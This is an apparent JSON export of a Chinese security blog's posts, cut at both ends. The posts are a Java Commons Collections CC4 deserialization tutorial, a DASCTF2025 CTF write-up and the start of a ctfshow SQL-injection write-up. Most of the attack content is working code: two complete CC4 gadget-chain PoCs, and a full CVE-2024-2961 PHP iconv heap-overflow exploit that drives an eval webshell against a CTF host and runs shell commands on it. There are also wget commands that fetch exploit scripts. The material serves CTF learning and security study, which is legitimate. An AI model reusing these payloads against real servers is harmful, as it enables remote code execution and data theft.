com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections4.Transformer;\nimport org.apache.commons.collections4.functors.ChainedTransformer;\nimport org.apache.commons.collections4.functors.ConstantTransformer;\nimport org.apache.commons.collections4.functors.InstantiateTransformer;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\n\nimport javax.xml.transform.Templates;\nimport java.io.*;\n\n\npublic class CC4 {\n    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {\n        TemplatesImpl templates = new TemplatesImpl();\n        setFieldValue(templates,\"_name\",\"a\");\n\n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\java\\\\JavaSec\\\\CC1\\\\target\\\\classes\\\\POC\\\\CC3\\\\URLClassLoader_test.class\"));\n        byte[][] codes = {code};\n        setFieldValue(templates,\"_bytecodes\",codes);\n\n        setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n\n        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});\n\n        Transformer[] transformers = new Transformer[] {\n                new ConstantTransformer(TrAXFilter.class),\n                instantiateTransformer\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n        \n        //CC4前半段\n        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);\n        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);\n        \n        Class priorityqueue = priorityQueue.getClass();\n        Field size = priorityqueue.getDeclaredField(\"size\");\n        size.setAccessible(true);\n        size.set(priorityQueue, 2);\n        serialize(priorityQueue);\n        unserialize(\"CC4.txt\");\n    }\n    public static void setFieldValue(Object object, String field_name, Object field_value) throws NoSuchFieldException, IllegalAccessException{\n        Class c = object.getClass();\n        Field field = c.getDeclaredField(field_name);\n        field.setAccessible(true);\n        field.set(object, field_value);\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws IOException {\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CC4.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws IOException, ClassNotFoundException{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    }\n}\n\n```\n\n重新调试之后成功弹计算器\n\n![image-20250625214359144](../image/achieve/202411/java学习/image-20250625214359144.png)\n\n这里可以直接用自定义的赋值函数去赋值，我写的时候整忘了哈哈哈\n\n#### 方法二：用add方法去赋值\n\n从[infer师傅的博客文章](https://infernity.top/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC4%E9%93%BE/#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A)中学到了一个新的方法，就是用该类自带的add方法去进行赋值\n\n```java\n    public boolean add(E e) {\n        return offer(e);\n    }\n```\n\n我们跟进一下offer方法\n\n```java\n    public boolean offer(E e) {\n        if (e == null)\n            throw new NullPointerException();\n        modCount++;\n        int i = size;\n        if (i >= queue.length)\n            grow(i + 1);\n        size = i + 1;\t//给size传值\n        if (i == 0)\n            queue[0] = e;\n        else\n            siftUp(i, e);\n        return true;\n    }\n```\n\n我们进入siftUp方法\n\n```java\n    private void siftUp(int k, E x) {\n        if (comparator != null)\n            siftUpUsingComparator(k, x);\n        else\n            siftUpComparable(k, x);\n    }\n```\n\n发现siftUP和siftDown方法几乎是一模一样的，我们跟进siftUpUsingComparator方法看看呢\n\n```java\n    private void siftUpUsingComparator(int k, E x) {\n        while (k > 0) {\n            int parent = (k - 1) >>> 1;\n            Object e = queue[parent];\n            if (comparator.compare(x, (E) e) >= 0)\n                break;\n            queue[k] = e;\n            k = parent;\n        }\n        queue[k] = x;\n    }\n```\n\n跟之前的逻辑差不多\n\n这里跟URLDNS链差不多，如果我们直接调用add方法，这里就会走完整条链子，但是并不会反序列化，所以我们需要先在前面把比如给TransformingComparator赋值一个没用的，然后add完了之后再改回chainedTransformer。\n\n```java\nTransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));\n```\n\nadd后反射修改回去即可\n\n## 最终的POC2\n\n```java\npackage POC.CC4;\n\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.PriorityQueue;\nimport javax.xml.transform.Templates;\nimport java.io.*;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections4.Transformer;\nimport org.apache.commons.collections4.functors.ChainedTransformer;\nimport org.apache.commons.collections4.functors.ConstantTransformer;\nimport org.apache.commons.collections4.functors.InstantiateTransformer;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\n\npublic class CC4 {\n    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {\n        TemplatesImpl templates = new TemplatesImpl();\n        setFieldValue(templates,\"_name\",\"a\");\n\n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\java\\\\JavaSec\\\\CC1\\\\target\\\\classes\\\\POC\\\\CC3\\\\URLClassLoader_test.class\"));\n        byte[][] codes = {code};\n        setFieldValue(templates,\"_bytecodes\",codes);\n\n        setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n\n        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});\n\n        Transformer[] transformers = new Transformer[] {\n                new ConstantTransformer(TrAXFilter.class),\n                instantiateTransformer\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));\n        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);\n        //方法一：修改size值\n//        Class priorityqueue = priorityQueue.getClass();\n//        Field size = priorityqueue.getDeclaredField(\"size\");\n//        size.setAccessible(true);\n//        size.set(priorityQueue, 2);\n\n        //方法二：add方法触发链\n        priorityQueue.add(1);\n        priorityQueue.add(2);\n        setFieldValue(transformingComparator,\"transformer\",chainedTransformer);\n\n        serialize(priorityQueue);\n        unserialize(\"CC4.txt\");\n    }\n    public static void setFieldValue(Object object, String field_name, Object field_value) throws NoSuchFieldException, IllegalAccessException{\n        Class c = object.getClass();\n        Field field = c.getDeclaredField(field_name);\n        field.setAccessible(true);\n        field.set(object, field_value);\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws IOException {\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CC4.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws IOException, ClassNotFoundException{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    }\n}\n\n```\n\nend~\n","tags":["java反序列化"],"categories":["javasec"]},{"title":"DASCTF2025上半年赛","url":"/2025/06/21/DASCTF2025上半年赛/","content":"\n## phpms\n\n发现有.git文件泄露，用GitHack提取一下\n\n![image-20250621123058799](../image/achieve/202411/DASCTF2025/image-20250621123058799.png)\n\n但是这些文件都是空的，用git diff拿到源码\n\n```php\ngit log --oneline\ngit show 613dea6\n\ngit stash list\ngit stash show -p\n```\n\n```php\n<?php\n$shell = $_GET['shell'];\nif(preg_match('/\\x0a|\\x0d/',$shell)){\n    echo ':(';\n}else{\n    eval(\"#$shell\");\n}\n?>\n```\n\n测了大半天发现disable_functions禁用了很多函数，后面发现可以用原生类方法去打\n\n![image-20250621134424704](../image/achieve/202411/DASCTF2025/image-20250621134424704.png)\n\n```php\n?shell=?><?php $iterator = new FilesystemIterator('/');\nforeach ($iterator as $fileinfo) {\n    echo $fileinfo->getFilename() . \"\\n\";\n}\n```\n\n这里的话用`?>`闭合前面的注释符，然后用原生类去读目录\n\n用SplFileObject读一下文件\n\n![image-20250621135145153](../image/achieve/202411/DASCTF2025/image-20250621135145153.png)\n\n```php\n?shell=?><?php $content=new SplFileObject('/etc/passwd');\nforeach($content as $content){\n    echo $content.\"<br>\";\n}\n```\n\n既然可以读文件，一开始想的是CVE-2024-2961的任意文件读取到RCE，但是没测出来，一次失败的尝试\n\nhttps://github.com/vulhub/vulhub/tree/master/php/CVE-2024-2961\n\n```python\npip install pwntools\npip install https://github.com/cfreal/ten/archive/refs/heads/main.zip\nwget https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py\npython cnext-exploit.py http://your-ip:8080/index.php \"echo '<?=phpinfo();?>' > shell.php\"\n```\n\n但是bao'cuo\n\nhttps://github.com/kezibei/php-filter-iconv\n\n包师傅的POC\n\n```python\n#!/usr/bin/python\n# -*- coding: utf-8 -*-\nfrom dataclasses import dataclass\nimport re\nimport sys\nimport requests\nfrom pwn import *\nimport zlib\nimport os\nimport binascii\n\n\nHEAP_SIZE = 2 * 1024 * 1024\nBUG = \"劄\".encode(\"utf-8\")\n\n@dataclass\nclass Region:\n    \"\"\"A memory region.\"\"\"\n\n    start: int\n    stop: int\n    permissions: str\n    path: str\n\n    @property\n    def size(self):\n        return self.stop - self.start\n\n\ndef print_hex(data):\n    hex_string = binascii.hexlify(data).decode()\n    print(hex_string)\n\n\ndef chunked_chunk(data: bytes, size: int = None) -> bytes:\n    \"\"\"Constructs a chunked representation of the given chunk. If size is given, the\n    chunked representation has size `size`.\n    For instance, `ABCD` with size 10 becomes: `0004\\nABCD\\n`.\n    \"\"\"\n    # The caller does not care about the size: let's just add 8, which is more than\n    # enough\n    if size is None:\n        size = len(data) + 8\n    keep = len(data) + len(b\"\\n\\n\")\n    size = f\"{len(data):x}\".rjust(size - keep, \"0\")\n    return size.encode() + b\"\\n\" + data + b\"\\n\"\n\n\ndef compressed_bucket(data: bytes) -> bytes:\n    \"\"\"Returns a chunk of size 0x8000 that, when dechunked, returns the data.\"\"\"\n    return chunked_chunk(data, 0x8000)\n\n\ndef compress(data) -> bytes:\n    \"\"\"Returns data suitable for `zlib.inflate`.\n    \"\"\"\n    # Remove 2-byte header and 4-byte checksum\n    return zlib.compress(data, 9)[2:-4]\n\n\ndef ptr_bucket(*ptrs, size=None) -> bytes:\n    \"\"\"Creates a 0x8000 chunk that reveals pointers after every step has been ran.\"\"\"\n    if size is not None:\n        assert len(ptrs) * 8 == size\n    bucket = b\"\".join(map(p64, ptrs))\n    bucket = qpe(bucket)\n    bucket = chunked_chunk(bucket)\n    bucket = chunked_chunk(bucket)\n    bucket = chunked_chunk(bucket)\n    bucket = compressed_bucket(bucket)\n\n    return bucket\n\n\ndef qpe(data: bytes) -> bytes:\n    \"\"\"Emulates quoted-printable-encode.\n    \"\"\"\n    return \"\".join(f\"={x:02x}\" for x in data).upper().encode()\n\n\ndef b64(data: bytes, misalign=True) -> bytes:\n    payload = base64.b64encode(data)\n    if not misalign and payload.endswith(\"=\"):\n        raise ValueError(f\"Misaligned: {data}\")\n    return payload\n\n\ndef _get_region(regions, *names):\n    \"\"\"Returns the first region whose name matches one of the given names.\"\"\"\n    for region in regions:\n        if any(name in region.path for name in names):\n            break\n    else:\n        pass\n    return region\n\n\ndef find_main_heap(regions):\n    # Any anonymous RW region with a size superior to the base heap size is a\n    # candidate. The heap is at the bottom of the region.\n    heaps = [\n        region.stop - HEAP_SIZE + 0x40\n        for region in reversed(regions)\n        if region.permissions == \"rw-p\"\n        and region.size >= HEAP_SIZE\n        and region.stop & (HEAP_SIZE - 1) == 0\n        and region.path == \"\"\n    ]\n\n    if not heaps:\n        pass\n\n    first = heaps[0]\n\n    if len(heaps) > 1:\n        heaps = \", \".join(map(hex, heaps))\n        print(\"Potential heaps: \" + heaps + \" (using first)\")\n    else:\n        # print(\"[*]Using \" + hex(first) + \" as heap\")\n        pass\n\n    return first\n\n\ndef get_regions(maps_path):\n    \"\"\"Obtains the memory regions of the PHP process by querying /proc/self/maps.\"\"\"\n    f = open('maps', 'rb')\n    maps = f.read().decode()\n    PATTERN = re.compile(\n        r\"^([a-f0-9]+)-([a-f0-9]+)\\b\" r\".*\" r\"\\s([-rwx]{3}[ps])\\s\" r\"(.*)\"\n    )\n    regions = []\n    for region in maps.split(\"\\n\"):\n        # print(region)\n        match = PATTERN.match(region)\n        if match:\n            start = int(match.group(1), 16)\n            stop = int(match.group(2), 16)\n            permissions = match.group(3)\n            path = match.group(4)\n            if \"/\" in path or \"[\" in path:\n                path = path.rsplit(\" \", 1)[-1]\n            else:\n                path = \"\"\n            current = Region(start, stop, permissions, path)\n            regions.append(current)\n        else:\n            # print(\"[*]Unable to parse memory mappings\")\n            pass\n\n    # print(\"[*]Got \" + str(len(regions)) + \" memory regions\")\n    return regions\n\n\ndef get_symbols_and_addresses(regions):\n    # PHP's heap\n    heap = find_main_heap(regions)\n\n    # Libc\n    libc_info = _get_region(regions, \"libc-\", \"libc.so\")\n\n    return heap, libc_info\n\n\ndef build_exploit_path(libc, heap, sleep, padding, cmd):\n    LIBC = libc\n    ADDR_EMALLOC = LIBC.symbols[\"__libc_malloc\"]\n    ADDR_EFREE = LIBC.symbols[\"__libc_system\"]\n    ADDR_EREALLOC = LIBC.symbols[\"__libc_realloc\"]\n    ADDR_HEAP = heap\n    ADDR_FREE_SLOT = ADDR_HEAP + 0x20\n    ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168\n\n    ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10\n\n    CS = 0x100\n\n    # Pad needs to stay at size 0x100 at every step\n    pad_size = CS - 0x18\n    pad = b\"\\x00\" * pad_size\n    pad = chunked_chunk(pad, len(pad) + 6)\n    pad = chunked_chunk(pad, len(pad) + 6)\n    pad = chunked_chunk(pad, len(pad) + 6)\n    pad = compressed_bucket(pad)\n\n    step1_size = 1\n    step1 = b\"\\x00\" * step1_size\n    step1 = chunked_chunk(step1)\n    step1 = chunked_chunk(step1)\n    step1 = chunked_chunk(step1, CS)\n    step1 = compressed_bucket(step1)\n\n    # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to\n    # ISO-2022-CN-EXT. We add a `0\\n` that makes the 4th and last dechunk \"crash\"\n\n    step2_size = 0x48\n    step2 = b\"\\x00\" * (step2_size + 8)\n    step2 = chunked_chunk(step2, CS)\n    step2 = chunked_chunk(step2)\n    step2 = compressed_bucket(step2)\n\n    step2_write_ptr = b\"0\\n\".ljust(step2_size, b\"\\x00\") + p64(ADDR_FAKE_BIN)\n    step2_write_ptr = chunked_chunk(step2_write_ptr, CS)\n    step2_write_ptr = chunked_chunk(step2_write_ptr)\n    step2_write_ptr = compressed_bucket(step2_write_ptr)\n\n    step3_size = CS\n\n    step3 = b\"\\x00\" * step3_size\n    assert len(step3) == CS\n    step3 = chunked_chunk(step3)\n    step3 = chunked_chunk(step3)\n    step3 = chunked_chunk(step3)\n    step3 = compressed_bucket(step3)\n\n    step3_overflow = b\"\\x00\" * (step3_size - len(BUG)) + BUG\n    assert len(step3_overflow) == CS\n    step3_overflow = chunked_chunk(step3_overflow)\n    step3_overflow = chunked_chunk(step3_overflow)\n    step3_overflow = chunked_chunk(step3_overflow)\n    step3_overflow = compressed_bucket(step3_overflow)\n\n    step4_size = CS\n    step4 = b\"=00\" + b\"\\x00\" * (step4_size - 1)\n    step4 = chunked_chunk(step4)\n    step4 = chunked_chunk(step4)\n    step4 = chunked_chunk(step4)\n    step4 = compressed_bucket(step4)\n\n    # This chunk will eventually overwrite mm_heap->free_slot\n    # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values\n    step4_pwn = ptr_bucket(\n        0x200000,\n        0,\n        # free_slot\n        0,\n        0,\n        ADDR_CUSTOM_HEAP,  # 0x18\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        ADDR_HEAP,  # 0x140\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        size=CS,\n    )\n\n    step4_custom_heap = ptr_bucket(\n        ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18\n    )\n\n    step4_use_custom_heap_size = 0x140\n\n    COMMAND = cmd\n    COMMAND = f\"kill -9 $PPID; {COMMAND}\"\n    if sleep:\n        COMMAND = f\"sleep {sleep}; {COMMAND}\"\n    COMMAND = COMMAND.encode() + b\"\\x00\"\n\n    assert (\n            len(COMMAND) <= step4_use_custom_heap_size\n    ), f\"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}\"\n    COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b\"\\x00\")\n\n    step4_use_custom_heap = COMMAND\n    step4_use_custom_heap = qpe(step4_use_custom_heap)\n    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)\n    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)\n    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)\n    step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)\n    pages = (\n            step4 * 3\n            + step4_pwn\n            + step4_custom_heap\n            + step4_use_custom_heap\n            + step3_overflow\n            + pad * padding\n            + step1 * 3\n            + step2_write_ptr\n            + step2 * 2\n    )\n\n    resource = compress(compress(pages))\n    resource = b64(resource)\n    resource = f\"data:text/plain;base64,{resource.decode()}\"\n\n    filters = [\n        # Create buckets\n        \"zlib.inflate\",\n        \"zlib.inflate\",\n\n        # Step 0: Setup heap\n        \"dechunk\",\n        \"convert.iconv.latin1.latin1\",\n\n        # Step 1: Reverse FL order\n        \"dechunk\",\n        \"convert.iconv.latin1.latin1\",\n\n        # Step 2: Put fake pointer and make FL order back to normal\n        \"dechunk\",\n        \"convert.iconv.latin1.latin1\",\n\n        # Step 3: Trigger overflow\n        \"dechunk\",\n        \"convert.iconv.UTF-8.ISO-2022-CN-EXT\",\n\n        # Step 4: Allocate at arbitrary address and change zend_mm_heap\n        \"convert.quoted-printable-decode\",\n        \"convert.iconv.latin1.latin1\",\n    ]\n    filters = \"|\".join(filters)\n    path = f\"php://filter/read={filters}/resource={resource}\"\n    path = path.replace(\"+\", \"%2b\")\n    return path\n\n# -------------------------- 简化版主函数 --------------------------\ndef exp():\n    ip = \"cd75b1b6-18d7-4482-911c-43be6f8dbeab.node5.buuoj.cn\"\n    port = \"81\"\n    url = f\"http://{ip}:{port}/\"\n\n    maps = base64.b64decode(requests.get(\n        f\"{url}?shell=?%3E%3C?php%20$context%20=%20new%20SplFileObject(%27php://filter/convert.base64-encode/resource=/proc/self/maps%27);foreach($context%20as%20$f){{echo($f);}}\"\n    ).text)\n    open(\"maps\", \"wb\").write(maps)\n\n    libc = base64.b64decode(requests.get(\n        f\"{url}?shell=?%3E%3C?php%20$context%20=%20new%20SplFileObject(%27php://filter/convert.base64-encode/resource=/lib/x86_64-linux-gnu/libc-2.31.so%27);foreach($context%20as%20$f){{echo($f);}}\"\n    ).text)\n    open(\"libc-2.23.so\", \"wb\").write(libc)\n\n    regions = get_regions(\"maps\")\n    heap, libc_info = get_symbols_and_addresses(regions)\n    libc = ELF(\"libc-2.23.so\", checksec=False)\n    libc.address = libc_info.start\n\n    cmd = \"(echo \\\"auth admin123\\nkeys *\\nget flag\\\" | redis-cli) > /tmp/1.txt\"\n    payload = build_exploit_path(libc, heap, sleep=1, padding=20, cmd=cmd)\n\n    try:\n        requests.get(f\"{url}?shell=?%3E%3C?php%20$context=new%20SplFileObject(%27{payload}%27);foreach($context%20as%20$f){{echo($f);}}\")\n    except:\n        pass\n    time.sleep(2)\n\n    result = requests.get(f\"{url}?shell=?%3E%3C?php%20$context=new%20SplFileObject(%27/tmp/1.txt%27);foreach($context%20as%20$f){{echo($f);}}\").text\n    match = re.search(r\"DASCTF{.*?}\", result)\n    if match:\n        print(\"[+] Got flag:\", match.group(0))\n    else:\n        print(\"[-] Flag not found\")\n\n# --------------------------\nif __name__ == '__main__':\n    exp()\n```\n\n## 再短一点点（赛后）\n\n首先感谢Infer师傅写的14页wp，特别详细！\n\n附件jar包放jadx里面反编译一下\n\n![image-20250622154021262](../image/achieve/202411/DASCTF2025/image-20250622154021262.png)\n\n把源码导出来放IDEA里面吧，感觉在这里面查函数和用法不太方便\n\n先看一下控制器代码\n\n```java\npackage GFCTF;\n\nimport java.io.BufferedReader;\nimport java.io.ByteArrayInputStream;\nimport java.io.File;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.io.InvalidClassException;\nimport java.io.PrintWriter;\nimport java.io.StringWriter;\nimport java.util.Base64;\nimport java.util.zip.InflaterInputStream;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.ResponseBody;\n\n@Controller\n/* loaded from: ezSpringBoot-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/GFCTF/MyController.class */\npublic class MyController {\n    @GetMapping({\"/\"})\n    @ResponseBody\n    public String index() {\n        return \"<h1>Welcome to GFCTF!</h1>\";\n    }\n\n    @GetMapping({\"/flag\"})\n    @ResponseBody\n    public String flag() throws IOException {\n        File file = new File(\"/a\");\n        if (file.exists()) {\n            return \"Good luck~\";\n        }\n        BufferedReader reader = new BufferedReader(new FileReader(\"/flag\"));\n        return \"Congratulations, you deserve it: \" + reader.readLine();\n    }\n\n    @PostMapping({\"/deser\"})\n    @ResponseBody\n    public String deserialize(@RequestParam String payload) {\n        if (payload.length() > 1282) {\n            return \"Your payload is too long! Go back and modify it!!!\";\n        }\n        byte[] bytes = Base64.getDecoder().decode(payload);\n        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);\n        try {\n            MyObjectInputStream myObjectInputStream = new MyObjectInputStream(new InflaterInputStream(byteArrayInputStream));\n            myObjectInputStream.readObject();\n            return \"Ok\";\n        } catch (InvalidClassException e) {\n            return e.getMessage();\n        } catch (Exception e2) {\n            e2.printStackTrace();\n            StringWriter sw = new StringWriter();\n            PrintWriter pw = new PrintWriter(sw);\n            e2.printStackTrace(pw);\n            String stackTrace = sw.toString();\n            if (stackTrace.contains(\"getStylesheetDOM\")) {\n                return \"命运的硬币抛向了反面，重启环境试试？\";\n            }\n            return \"something went wrong :(\";\n        }\n    }\n}\n```\n\n在/deser路由下有反序列化的操作，这里的话需要post传入payload，并且payload的长度不能大于1282，之后会进行base64解码，我们接下来看主要部分\n\n```java\nByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);\n        try {\n            MyObjectInputStream myObjectInputStream = new MyObjectInputStream(new InflaterInputStream(byteArrayInputStream));\n            myObjectInputStream.readObject();\n            return \"Ok\";\n        } \n```\n\n先是进行一个常规的Byte字节流的获取，我们看一下InflaterInputStream\n\n![image-20250622160145768](../image/achieve/202411/DASCTF2025/image-20250622160145768.png)\n\n这里会使用指定的解压缩器和默认的缓冲区大小创建一个新的输入流。\n\n然后看一下MyObjectInputStream，其实就是一个反序列化的操作，只不过换了个类名\n\n所以这里的话基本上可以确定是反序列化了，我们来看另一个路由\n\n```java\n@GetMapping({\"/flag\"})\n    @ResponseBody\n    public String flag() throws IOException {\n        File file = new File(\"/a\");\n        if (file.exists()) {\n            return \"Good luck~\";\n        }\n        BufferedReader reader = new BufferedReader(new FileReader(\"/flag\"));\n        return \"Congratulations, you deserve it: \" + reader.readLine();\n    }\n```\n\n这里的话会试图读取一个/a的文件，如果文件存在就返回`Good luck~`，否则就会读取flag，然后逐行输出\n\n那我们在环境中访问一下/flag路由，发现确实返回`Good luck~`，所以我们要触发反序列化去删除掉这个根目录的a文件，这样才能读到flag\n\n一开始的话我的想法是找java.io.File类中的delete()方法去调用删除a文件，但是没找到合适的，然后就来到了赛后复现\n\n我们先来看一下反序列化的代码，毕竟他是自己写的，肯定有什么过滤啥的\n\n![image-20250622160746659](../image/achieve/202411/DASCTF2025/image-20250622160746659.png)\n\n这里的话主要是过滤了三个包\n\n```java\nString[] denyClasses = {\"com.sun.org.apache.xalan.internal.xsltc.trax\", \"javax.management\", \"org.springframework.aop.aspectj\"};\n```\n\n第一个主要过滤TemplatesImpl类，这个类我们需要用来rce。\n\n第二个主要过滤javax.management.BadAttributeValueExpException类，这个类常用来触发toString。\n\n第三个过滤了最近一条aop链，这里不重要。\n\n然后我们来看一下利用链的构造和分析\n\n我们看一下lib文件夹\n\n![image-20250622161659034](../image/achieve/202411/DASCTF2025/image-20250622161659034.png)\n\n有jackson依赖，还禁用了emplatesImpl类，估计是要打二次反序列化的\n\n参考一下infer师傅的文章：https://infernity.top/2025/03/05/Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#poc-1\n\n里面的poc可以拿来用，但是需要改几个地方\n\n### 序列化方法的编写\n\n第一个就是我们之前看到的解压输入流InflaterInputStream的操作，我们在序列化的时候需要压缩我们的输出流，所以这里要用到DeflaterOutputStream，写个完整的序列化方法\n\n![image-20250622163038073](../image/achieve/202411/DASCTF2025/image-20250622163038073.png)\n\n```java\n    public static String serialize(Object obj) throws IOException{\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n\n        Deflater deflater = new Deflater(Deflater.BEST_COMPRESSION);\n        DeflaterOutputStream deflaterOutputStream = new DeflaterOutputStream(byteArrayOutputStream, deflater);\n\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(deflaterOutputStream);\n        objectOutputStream.writeObject(obj);\n        \n        //关闭流\n        objectOutputStream.flush();\n        objectOutputStream.close();\n        \n        String poc = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());\n        return poc ;\n    }\n```\n\n然后就是触发toString()方法的地方，因为javax.management.BadAttributeValueExpException类我们是用不了的，所以需要找其他可以触发toString()的方法\n\n搜到一个AliyunCTF的一个题目是打的原生反序列化，http://www.bmth666.cn/2024/03/31/%E7%AC%AC%E4%BA%8C%E5%B1%8A-AliyunCTF-chain17%E5%A4%8D%E7%8E%B0/index.html，这里的话就是用javax.swing.event.EventListenerList#readObject去触发toString方法，我们来看一下javax.swing.event.EventListenerList#readObject方法\n\n```java\n    private void readObject(ObjectInputStream s)\n        throws IOException, ClassNotFoundException {\n        listenerList = NULL_ARRAY;\n        s.defaultReadObject();\n        Object listenerTypeOrNull;\n\n        while (null != (listenerTypeOrNull = s.readObject())) {\n            ClassLoader cl = Thread.currentThread().getContextClassLoader();\n            EventListener l = (EventListener)s.readObject();\n            String name = (String) listenerTypeOrNull;\n            ReflectUtil.checkPackageAccess(name);\n            @SuppressWarnings(\"unchecked\")\n            Class<EventListener> tmp = (Class<EventListener>)Class.forName(name, true, cl);\n            add(tmp, l);\n        }\n    }\n```\n\n里面的\n\n```java\nClass<EventListener> tmp = (Class<EventListener>)Class.forName(name, true, cl);\n add(tmp, l);\n```\n\n这里的话对类采用了add方法，我们跟进一下\n\n![image-20250622192429745](../image/achieve/202411/DASCTF2025/image-20250622192429745.png)\n\n这里的话就是将类和字符串进行拼接，此时就可以触发toString()方法，然后我们看看这个变量是否可控\n\n```java\nEventListener l = (EventListener)s.readObject();\n```\n\n这里会强制转化成EventListener的类，并且该类实现了序列化接口，我们看看writeObject的逻辑\n\n```java\n    @Serial\n    private void writeObject(ObjectOutputStream s) throws IOException {\n        Object[] lList = listenerList;\n        s.defaultWriteObject();\n\n        // Save the non-null event listeners:\n        for (int i = 0; i < lList.length; i+=2) {\n            Class<?> t = (Class)lList[i];\n            EventListener l = (EventListener)lList[i+1];\n            if (l instanceof Serializable) {\n                s.writeObject(t.getName());\n                s.writeObject(l);\n            }\n        }\n\n        s.writeObject(null);\n    }\n```\n\n这里的话会存放到 listenerList 属性中，那我们的poc就是\n\n\n\n","tags":["DASCTF2025"],"categories":["赛题wp"]},{"title":"ctfshow内部赛(已做完)","url":"/2025/06/19/ctfshow内部赛(已做完)/","content":"\n## 签到\n\n### #SQL注入\n\n一个登录界面，先常规扫一下目录\n\n```php\n[14:40:54] Scanning:\n[14:41:21] 200 -     0B - /db.php\n[14:41:29] 200 -    3KB - /login.php\n[14:41:39] 200 -    3KB - /register.php\n[14:41:44] 200 -   120B - /user.php\n[14:41:47] 200 -    3KB - /www.zip\n```\n\n把备份文件下下来看看\n\n```php\n//login.php\n<?php\nfunction check($arr){\nif(preg_match(\"/load|and|or|\\||\\&|select|union|\\'|=| |\\\\\\|,|sleep|ascii/i\",$arr)){\n\t\t\techo \"<script>alert('bad hacker!')</script>\";\n           die();   \n       }\nelse{\n\treturn true;\n}\n}\nsession_start();\ninclude('db.php');\nif(isset($_POST['e'])&&isset($_POST['p']))\n{\n$e=$_POST['e'];\n$p=$_POST['p'];\n$sql =\"select username from test1 where email='$e' and password='$p'\";\nif(check($e)&&check($p)){\n$result=mysqli_query($con,$sql);\n$row = mysqli_fetch_assoc($result);\n    if($row){ \n\t\t$_SESSION['u']=$row['username'];\n\t\theader('location:user.php');\n    }\n\telse {\n\t\techo \"<script>alert('Wrong username or password')</script>\";\n\t}\n}\n}\n \n?>\n```\n\n```php\n//register.php\n<?php\nfunction check($arr){\nif(preg_match(\"/load|and|\\||\\&| |\\\\\\|sleep|ascii|if/i\",$arr)){\n\t\t\techo \"<script>alert('bad hacker!')</script>\";\n           die();   \n       }\nelse{\n\treturn true;\n}\n}\n\ninclude('db.php');\nif(isset($_POST['e'])&&isset($_POST['u'])&&isset($_POST['p']))\n{\n$e=$_POST['e'];\n$u=$_POST['u'];\n$p=$_POST['p'];\n$sql =\n\"insert into test1\nset email = '$e', \nusername = '$u',\npassword = '$p'\n\";\nif(check($e)&&check($u)&&check($p)){\nif(mysqli_query($con, $sql))\n{\nheader('location:login.php');\n}\n}\n}\n 